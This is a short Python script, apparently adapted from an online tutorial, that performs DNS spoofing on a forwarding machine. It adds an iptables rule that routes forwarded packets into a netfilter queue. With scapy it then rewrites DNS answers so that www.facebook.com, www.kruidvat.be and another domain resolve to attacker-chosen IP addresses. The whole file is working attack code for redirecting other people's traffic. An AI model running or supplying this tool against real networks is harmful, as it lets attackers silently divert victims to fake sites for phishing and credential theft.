# libnetfilter_queue necessary for this code to work
# https://thepythoncode.com/article/make-dns-spoof-python
import subprocess
from netfilterqueue import NetfilterQueue
from scapy.all import IP, DNSRR, DNSQR, DNS, UDP


def addNetfilterForward(queueNumber):
    subprocess.run(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {queueNumber}", shell=True)

def removeNetfilterForward(queueNumber):
    subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {queueNumber}", shell=True)

def analyzePacket(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        scapy_packet=spoofPacket(scapy_packet)
    print("[After ]:", scapy_packet.summary())
    packet.set_payload(bytes(scapy_packet))
    packet.accept()

def spoofPacket(packet):
    print(packet[DNSQR].qname)
    qname=packet[DNSQR].qname
    if qname not in fake_dns_records.keys():
        return packet
    else:
        packet[DNS].an=DNSRR(rrname=qname, rdata=fake_dns_records[qname])
        packet[DNS].ancount=1
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet

# TODO: add compatibiblity to get dynamic list of hosts
def main():
    global fake_dns_records
    fake_dns_records = {
        b'www.facebook.com.': '172.217.19.142',
        b'www.kruidvat.be.': '69.69.69.69',
        b'wwf.lola.lol.': '8.4.6.8'
    }
    queueNumber = 0
    queue=NetfilterQueue()
    addNetfilterForward(queueNumber)

    try:
        queue.bind(queueNumber, analyzePacket)
        queue.run()
    except KeyboardInterrupt:
        print("Stopping DNS spoofing")
        removeNetfilterForward(queueNumber)
        queue.unbind()
    except:
        print("Error binding queue")
        exit(1)



if __name__ == "__main__":
    main()